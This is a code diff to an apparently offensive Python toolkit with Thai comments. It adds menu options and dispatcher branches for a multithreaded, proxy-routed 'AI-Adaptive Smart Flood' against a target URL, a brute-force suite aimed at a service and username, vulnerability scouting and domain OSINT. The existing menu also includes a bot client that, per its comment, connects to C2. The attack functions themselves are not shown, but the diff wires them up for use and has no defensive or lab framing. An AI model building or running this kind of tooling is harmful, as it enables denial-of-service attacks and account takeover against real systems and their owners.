@@ -173,7 +173,11 @@ class Menu:  # คลาสสำหรับระบบเมนู
         "17": {"name": "Port Scanner", "func": "port_scanner", "needs_root": False},  # เครื่องมือสแกนพอร์ต
         "18": {"name": "Launch Local Bot Client", "func": "launch_bot", "needs_root": False}, # เปิดบอทเชื่อมต่อ C2
         "20": {"name": "Local Network Recon (IP/Port/Status)", "func": "network_scanner", "needs_root": False},
-        "21": {"name": "IP-Tracker (Deep OSINT Intel)", "func": "ip_tracker", "needs_root": False}
+        "21": {"name": "IP-Tracker (Deep OSINT Intel)", "func": "ip_tracker", "needs_root": False},
+        "22": {"name": "AI-Adaptive Smart Flood", "func": "adaptive_flood", "needs_root": False},
+        "23": {"name": "Vulnerability Scout", "func": "vulnerability_scout", "needs_root": False},
+        "24": {"name": "Brute-Force Suite", "func": "brute_force_suite", "needs_root": False},
+        "25": {"name": "Domain OSINT Hunter", "func": "domain_osint", "needs_root": False}
     }
 
     @staticmethod  # decorator สำหรับเมธอด static
@@ -364,3 +368,22 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
         elif choice == "21": # IP Tracker
             from utils import ip_tracker
             ip_tracker(params.get("ip"))
+
+        elif choice == "22": # AI-Adaptive Smart Flood
+            from attacks import adaptive_flood
+            url = target if target.startswith("http") else f"http://{target}"
+            for _ in range(threads):
+                increment_thread_counter()
+                threading.Thread(target=adaptive_flood, args=(url, duration, proxies, monitor), daemon=True).start()
+
+        elif choice == "23": # Vulnerability Scout
+            from attacks import vulnerability_scout
+            vulnerability_scout(target)
+
+        elif choice == "24": # Brute-Force Suite
+            from attacks import brute_force_suite
+            brute_force_suite(target, params.get("service"), params.get("username"))
+
+        elif choice == "25": # Domain OSINT
+            from attacks import domain_osint
+            domain_osint(target)
